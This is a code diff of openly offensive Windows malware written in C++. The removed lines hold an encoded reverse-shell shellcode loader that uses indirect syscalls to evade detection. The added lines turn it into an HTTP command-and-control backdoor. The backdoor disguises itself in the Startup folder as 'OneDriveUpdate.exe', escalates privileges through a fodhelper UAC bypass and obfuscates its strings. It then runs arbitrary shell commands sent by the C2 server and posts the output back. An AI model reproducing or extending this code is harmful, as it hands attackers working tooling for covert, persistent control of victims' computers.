@@ -1,181 +1,249 @@
 #include <windows.h>
+#include <wininet.h>
 #include <iostream>
 #include <shlobj.h>
+#include <string>
+#include <memory>
+#include <vector>
+#include <fstream>
 
-// --- 1. DEFINITIONS DES SIGNATURES ---
+#include "config.h"
 
-extern "C" void SetSyscallConfig(DWORD ssn, void* syscall_addr);
+using namespace std;
 
-extern "C" NTSTATUS NtAllocateVirtualMemory(
-    HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, 
-    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
-
-extern "C" NTSTATUS NtWriteVirtualMemory(
-    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, 
-    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
-
-extern "C" NTSTATUS NtCreateThreadEx(
-    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
-    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
-    ULONG CreateFlags, ULONG_PTR ZeroBits, SIZE_T StackSize,
-    SIZE_T MaximumStackSize, PVOID AttributeList);
-
-extern "C" NTSTATUS NtProtectVirtualMemory(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
-
-void* GetSyscallGadget(HMODULE hNtdll) {
-    unsigned char* pBase = (unsigned char*)hNtdll;
-    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
-    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
-    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
-
-    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
-        if (strcmp((char*)pSec[i].Name, ".text") == 0) {
-            unsigned char* pStart = pBase + pSec[i].VirtualAddress;
-            unsigned char* pEnd = pStart + pSec[i].Misc.VirtualSize;
-            
-            for (unsigned char* p = pStart; p < pEnd - 2; p++) {
-                if (p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3) {
-                    return (void*)p;
-                }
-            }
-        }
+string Deobfuscate(const char* encrypted_data, size_t length) {
+    string decrypted = "";
+    for (size_t i = 0; i < length; i++) {
+        decrypted += (encrypted_data[i] ^ XOR_KEY);
     }
-    return NULL;
+    return decrypted;
 }
 
-DWORD GetSSN(HMODULE hNtdll, const char* funcName) {
-    void* funcAddr = (void*)GetProcAddress(hNtdll, funcName);
-    if (!funcAddr) return -1;
-
-    BYTE* p = (BYTE*)funcAddr;
-    return (DWORD)p[4]; 
-}
+// "cmd /c "
+char S_CMD[] = {0x58, 0x56, 0x5f, 0x1b, 0x14, 0x58, 0x1b};
+// "Mozilla/5.0"
+char S_UA[] = {0x76, 0x54, 0x41, 0x52, 0x57, 0x57, 0x5a, 0x14, 0x0e, 0x15, 0x0b};
+// "Software\Classes\ms-settings\Shell\Open\command"
+char S_REG[] = {0x68, 0x54, 0x5d, 0x4f, 0x4c, 0x5a, 0x49, 0x5e, 0x66, 0x57, 0x5a, 0x48, 0x48, 0x5e, 0x48, 0x66, 0x56, 0x48, 0x16, 0x48, 0x5e, 0x4f, 0x4f, 0x52, 0x55, 0x5c, 0x48, 0x66, 0x68, 0x53, 0x5e, 0x57, 0x57, 0x66, 0x74, 0x4b, 0x5e, 0x55, 0x66, 0x58, 0x54, 0x56, 0x56, 0x5a, 0x55, 0x5f};
+// "fodhelper.exe"
+char S_FOD[] = {0x5d, 0x54, 0x5f, 0x53, 0x5e, 0x57, 0x4b, 0x5e, 0x49, 0x15, 0x5e, 0x43, 0x5e};
+// "\OneDriveUpdate.exe"
+char S_PER[] = {0x67, 0x74, 0x55, 0x5e, 0x7f, 0x49, 0x52, 0x4d, 0x5e, 0x6e, 0x4b, 0x5f, 0x5a, 0x4f, 0x5e, 0x15, 0x5e, 0x43, 0x5e};
+// "DelegateExecute"
+char S_DLG[] = {0x7f, 0x5e, 0x57, 0x5e, 0x5c, 0x5a, 0x4f, 0x5e, 0x7e, 0x43, 0x5e, 0x58, 0x4e, 0x4f, 0x5e};
+// "open"
+char S_OPN[] = {0x54, 0x4b, 0x5e, 0x55};
 
 void UACBypass() {
     HKEY hKey;
     char szPath[MAX_PATH];
-    
     if (GetModuleFileNameA(NULL, szPath, MAX_PATH) == 0) return;
 
     char cmd[MAX_PATH + 50];
     sprintf(cmd, "%s", szPath); 
 
-    if (RegCreateKeyExA(HKEY_CURRENT_USER, 
-        "Software\\Classes\\ms-settings\\Shell\\Open\\command", 
-        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+    string regPath = Deobfuscate(S_REG, sizeof(S_REG));
+    string delegate = Deobfuscate(S_DLG, sizeof(S_DLG));
+    string s_open = Deobfuscate(S_OPN, sizeof(S_OPN));
+    string s_fod = Deobfuscate(S_FOD, sizeof(S_FOD));
 
+    if (RegCreateKeyExA(HKEY_CURRENT_USER, regPath.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
         RegSetValueExA(hKey, "", 0, REG_SZ, (unsigned char*)cmd, strlen(cmd));
-
-        RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (unsigned char*)"", 0);
-        
+        RegSetValueExA(hKey, delegate.c_str(), 0, REG_SZ, (unsigned char*)"", 0);
         RegCloseKey(hKey);
-
-        ShellExecuteA(NULL, "open", "fodhelper.exe", NULL, NULL, SW_HIDE);
+        ShellExecuteA(NULL, s_open.c_str(), s_fod.c_str(), NULL, NULL, SW_HIDE);
     }
 }
 
 void InstallPersistence() {
     char szPath[MAX_PATH];
     char szDest[MAX_PATH];
-
     if (GetModuleFileNameA(NULL, szPath, MAX_PATH) == 0) return;
 
     if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, szDest))) {
-        
-        strcat(szDest, "\\OneDriveUpdate.exe");
-
+        string s_per = Deobfuscate(S_PER, sizeof(S_PER));
+        strcat(szDest, s_per.c_str());
         CopyFileA(szPath, szDest, FALSE);
     }
 }
 
-// --- 3. MAIN ---
+string GetTaskFromC2(const char* url) {
+    string ua = Deobfuscate(S_UA, sizeof(S_UA));
+    HINTERNET hInternet = InternetOpenA(ua.c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (!hInternet) return "";
+    
+    HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    if (!hConnect) {
+        InternetCloseHandle(hInternet);
+        return "";
+    }
+
+    char buffer[1024];
+    DWORD bytesRead;
+    string response = "";
+
+    while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
+        buffer[bytesRead] = 0;
+        response += buffer;
+    }
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hInternet);
+    return response;
+}
+
+void SendResultToC2(const char* ip, int port, const char* path, string data) {
+    string ua = Deobfuscate(S_UA, sizeof(S_UA));
+    HINTERNET hInternet = InternetOpenA(ua.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInternet) return;
+
+    HINTERNET hConnect = InternetConnectA(hInternet, ip, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    if (!hConnect) { InternetCloseHandle(hInternet); return; }
+
+    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
+    if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return; }
+
+    string headers = "Content-Type: text/plain\r\n";
+    HttpSendRequestA(hRequest, headers.c_str(), headers.length(), (LPVOID)data.c_str(), data.length());
+
+    InternetCloseHandle(hRequest);
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hInternet);
+}
+
+void SpawnProgram(const char* cmd) {
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_SHOW; 
+    ZeroMemory(&pi, sizeof(pi));
+
+    char cmdMutable[MAX_PATH];
+    strncpy(cmdMutable, cmd, MAX_PATH - 1);
+    cmdMutable[MAX_PATH - 1] = 0;
+
+    if (CreateProcessA(NULL,
+                       cmdMutable,
+                       NULL, 
+                       NULL, 
+                       FALSE,
+                       0,    
+                       NULL, 
+                       NULL, 
+                       &si,  
+                       &pi)  
+       ) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+}
+
+string ExecCommand(const char* cmd) {
+    string result = "";
+    HANDLE hPipeRead, hPipeWrite;
+
+    SECURITY_ATTRIBUTES saAttr = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
+    if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0)) {
+        return "[-] Error CreatePipe";
+    }
+
+    STARTUPINFOA si = {0};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+    si.wShowWindow = SW_HIDE;
+    si.hStdOutput = hPipeWrite;
+    si.hStdError = hPipeWrite; 
+
+    PROCESS_INFORMATION pi = {0};
+
+    string full_cmd = "cmd.exe /c " + string(cmd);
+
+    char cmd_mutable[1024];
+    strncpy(cmd_mutable, full_cmd.c_str(), sizeof(cmd_mutable));
+    cmd_mutable[sizeof(cmd_mutable) - 1] = 0;
+
+    if (!CreateProcessA(NULL, cmd_mutable, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+        CloseHandle(hPipeRead);
+        CloseHandle(hPipeWrite);
+        return "[-] Error CreateProcess";
+    }
+
+    CloseHandle(hPipeWrite);
+
+    char buffer[128];
+    DWORD bytesRead;
+    while (ReadFile(hPipeRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
+        buffer[bytesRead] = 0;
+        result += buffer;
+    }
+
+    CloseHandle(hPipeRead);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    return result;
+}
 
 int main() {
     InstallPersistence();
-    HMODULE hNtdll = GetModuleHandle("ntdll.dll");
-    void* gadget = GetSyscallGadget(hNtdll);
-    if (!gadget) return 1;
 
-    //reverse shell
-    unsigned char shellcode[] = {
-    0x73, 0xc7, 0x0c, 0x6b, 0x7f, 0x67, 0x4f, 0x8f, 0x8f, 0x8f, 0xce, 0xde,
-    0xce, 0xdf, 0xdd, 0xde, 0xd9, 0xc7, 0xbe, 0x5d, 0xea, 0xc7, 0x04, 0xdd,
-    0xef, 0xc7, 0x04, 0xdd, 0x97, 0xc7, 0x04, 0xdd, 0xaf, 0xc7, 0x04, 0xfd,
-    0xdf, 0xc7, 0x80, 0x38, 0xc5, 0xc5, 0xc2, 0xbe, 0x46, 0xc7, 0xbe, 0x4f,
-    0x23, 0xb3, 0xee, 0xf3, 0x8d, 0xa3, 0xaf, 0xce, 0x4e, 0x46, 0x82, 0xce,
-    0x8e, 0x4e, 0x6d, 0x62, 0xdd, 0xce, 0xde, 0xc7, 0x04, 0xdd, 0xaf, 0x04,
-    0xcd, 0xb3, 0xc7, 0x8e, 0x5f, 0x04, 0x0f, 0x07, 0x8f, 0x8f, 0x8f, 0xc7,
-    0x0a, 0x4f, 0xfb, 0xe8, 0xc7, 0x8e, 0x5f, 0xdf, 0x04, 0xc7, 0x97, 0xcb,
-    0x04, 0xcf, 0xaf, 0xc6, 0x8e, 0x5f, 0x6c, 0xd9, 0xc7, 0x70, 0x46, 0xce,
-    0x04, 0xbb, 0x07, 0xc7, 0x8e, 0x59, 0xc2, 0xbe, 0x46, 0xc7, 0xbe, 0x4f,
-    0x23, 0xce, 0x4e, 0x46, 0x82, 0xce, 0x8e, 0x4e, 0xb7, 0x6f, 0xfa, 0x7e,
-    0xc3, 0x8c, 0xc3, 0xab, 0x87, 0xca, 0xb6, 0x5e, 0xfa, 0x57, 0xd7, 0xcb,
-    0x04, 0xcf, 0xab, 0xc6, 0x8e, 0x5f, 0xe9, 0xce, 0x04, 0x83, 0xc7, 0xcb,
-    0x04, 0xcf, 0x93, 0xc6, 0x8e, 0x5f, 0xce, 0x04, 0x8b, 0x07, 0xc7, 0x8e,
-    0x5f, 0xce, 0xd7, 0xce, 0xd7, 0xd1, 0xd6, 0xd5, 0xce, 0xd7, 0xce, 0xd6,
-    0xce, 0xd5, 0xc7, 0x0c, 0x63, 0xaf, 0xce, 0xdd, 0x70, 0x6f, 0xd7, 0xce,
-    0xd6, 0xd5, 0xc7, 0x04, 0x9d, 0x66, 0xd8, 0x70, 0x70, 0x70, 0xd2, 0xc6,
-    0x31, 0xf8, 0xfc, 0xbd, 0xd0, 0xbc, 0xbd, 0x8f, 0x8f, 0xce, 0xd9, 0xc6,
-    0x06, 0x69, 0xc7, 0x0e, 0x63, 0x2f, 0x8e, 0x8f, 0x8f, 0xc6, 0x06, 0x6a,
-    0xc6, 0x33, 0x8d, 0x8f, 0x9e, 0xd3, 0x4f, 0x27, 0xea, 0x8e, 0xce, 0xdb,
-    0xc6, 0x06, 0x6b, 0xc3, 0x06, 0x7e, 0xce, 0x35, 0xc3, 0xf8, 0xa9, 0x88,
-    0x70, 0x5a, 0xc3, 0x06, 0x65, 0xe7, 0x8e, 0x8e, 0x8f, 0x8f, 0xd6, 0xce,
-    0x35, 0xa6, 0x0f, 0xe4, 0x8f, 0x70, 0x5a, 0xdf, 0xdf, 0xc2, 0xbe, 0x46,
-    0xc2, 0xbe, 0x4f, 0xc7, 0x70, 0x4f, 0xc7, 0x06, 0x4d, 0xc7, 0x70, 0x4f,
-    0xc7, 0x06, 0x4e, 0xce, 0x35, 0x65, 0x80, 0x50, 0x6f, 0x70, 0x5a, 0xc7,
-    0x06, 0x48, 0xe5, 0x9f, 0xce, 0xd7, 0xc3, 0x06, 0x6d, 0xc7, 0x06, 0x76,
-    0xce, 0x35, 0x16, 0x2a, 0xfb, 0xee, 0x70, 0x5a, 0xc7, 0x0e, 0x4b, 0xcf,
-    0x8d, 0x8f, 0x8f, 0xc6, 0x37, 0xec, 0xe2, 0xeb, 0x8f, 0x8f, 0x8f, 0x8f,
-    0x8f, 0xce, 0xdf, 0xce, 0xdf, 0xc7, 0x06, 0x6d, 0xd8, 0xd8, 0xd8, 0xc2,
-    0xbe, 0x4f, 0xe5, 0x82, 0xd6, 0xce, 0xdf, 0x6d, 0x73, 0xe9, 0x48, 0xcb,
-    0xab, 0xdb, 0x8e, 0x8e, 0xc7, 0x02, 0xcb, 0xab, 0x97, 0x49, 0x8f, 0xe7,
-    0xc7, 0x06, 0x69, 0xd9, 0xdf, 0xce, 0xdf, 0xce, 0xdf, 0xce, 0xdf, 0xc6,
-    0x70, 0x4f, 0xce, 0xdf, 0xc6, 0x70, 0x47, 0xc2, 0x06, 0x4e, 0xc3, 0x06,
-    0x4e, 0xce, 0x35, 0xf6, 0x43, 0xb0, 0x09, 0x70, 0x5a, 0xc7, 0xbe, 0x5d,
-    0xc7, 0x70, 0x45, 0x04, 0x81, 0xce, 0x35, 0x87, 0x08, 0x92, 0xef, 0x70,
-    0x5a, 0x34, 0x7f, 0x3a, 0x2d, 0xd9, 0xce, 0x35, 0x29, 0x1a, 0x32, 0x12,
-    0x70, 0x5a, 0xc7, 0x0c, 0x4b, 0xa7, 0xb3, 0x89, 0xf3, 0x85, 0x0f, 0x74,
-    0x6f, 0xfa, 0x8a, 0x34, 0xc8, 0x9c, 0xfd, 0xe0, 0xe5, 0x8f, 0xd6, 0xce,
-    0x06, 0x55, 0x70, 0x5a
-    };
-    SIZE_T shellcodeSize = sizeof(shellcode);
-    char key = 0x8F;
+    string c2_ip = Deobfuscate(S_IP, sizeof(S_IP));
+    int c2_port = C2_PORT;
+    char username[256];
+    DWORD len = 256;
+    GetUserNameA(username, &len);
+    
+    string welcome = "[+] Backdoor connected. Current user : ";
+    welcome += string(username);
+    string url_task = "http://" + c2_ip + ":" + to_string(c2_port) + "/get_task";
+    SendResultToC2(c2_ip.c_str(), c2_port, "/post_result", welcome);
+    while (true) {
+        int jitter = (rand() % 2000) + 1000;
+        Sleep(jitter);
 
-    for(int i=0; i<shellcodeSize; i++) {
-        shellcode[i] = shellcode[i] ^ key;
+        string tache = GetTaskFromC2(url_task.c_str());
+
+        if (tache.length() > 0 && tache.substr(0, 4) != "IDLE") {
+            string resultat = "";
+            
+            if (tache.rfind("spawn ", 0) == 0) {
+                string cmd_to_run = tache.substr(6);
+                SpawnProgram(cmd_to_run.c_str());
+                resultat = "[+] Process in background : " + cmd_to_run;
+            }
+            else if (tache == "whoami") {
+                resultat = string(username);
+            } else if (tache.rfind("prank ", 0) == 0) {
+                string message = tache.substr(6);
+                char tempPath[MAX_PATH];
+                GetTempPathA(MAX_PATH, tempPath);
+                string filename = string(tempPath) + "important.txt";
+                        
+                ofstream outfile(filename);
+                if (outfile.is_open()) {
+                    outfile << message << endl;
+                    outfile << "\n\n(Don't be so harsh on yourself, everybody can make mistake)" << endl;
+                    outfile.close();
+                    
+                    // 4. Ouvrir le fichier via son chemin complet
+                    // NULL à la place de "open" force l'action par défaut (souvent plus fiable)
+                    ShellExecuteA(NULL, NULL, filename.c_str(), NULL, NULL, SW_SHOW);
+                    
+                    resultat = "[+] Prank executed: Notepad opened at " + filename;
+                } else {
+                    resultat = "[-] Error: Could not write to " + filename;
+                }
+            }
+            else {
+                resultat = ExecCommand(tache.c_str());
+            }
+
+            if (resultat.length() > 0) {
+                SendResultToC2(c2_ip.c_str(), c2_port, "/post_result", resultat);
+            }
+        }
     }
-
-    HANDLE hProc = GetCurrentProcess();
-    NTSTATUS status;
-
-    DWORD ssnAlloc = GetSSN(hNtdll, "NtAllocateVirtualMemory");
-    SetSyscallConfig(ssnAlloc, gadget);
-    
-    void* allocAddr = NULL;
-    SIZE_T size = shellcodeSize;
-    status = NtAllocateVirtualMemory(hProc, &allocAddr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (status != 0) return 1;
-
-    // --- 4. ECRITURE ---
-    DWORD ssnWrite = GetSSN(hNtdll, "NtWriteVirtualMemory");
-    SetSyscallConfig(ssnWrite, gadget);
-    
-    SIZE_T bytesWritten = 0;
-    NtWriteVirtualMemory(hProc, allocAddr, shellcode, shellcodeSize, &bytesWritten);
-
-    DWORD ssnProtect = GetSSN(hNtdll, "NtProtectVirtualMemory");
-    SetSyscallConfig(ssnProtect, gadget);
-
-    ULONG oldProtect = 0;
-    status = NtProtectVirtualMemory(hProc, &allocAddr, &size, PAGE_EXECUTE_READ, &oldProtect);
-    if (status != 0) return 1;
-
-    DWORD ssnThread = GetSSN(hNtdll, "NtCreateThreadEx");
-    SetSyscallConfig(ssnThread, gadget);
-
-    HANDLE hThread = NULL;
-    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProc, allocAddr, NULL, FALSE, 0, 0, 0, NULL);
-
-    WaitForSingleObject(hThread, INFINITE);
     return 0;
 }
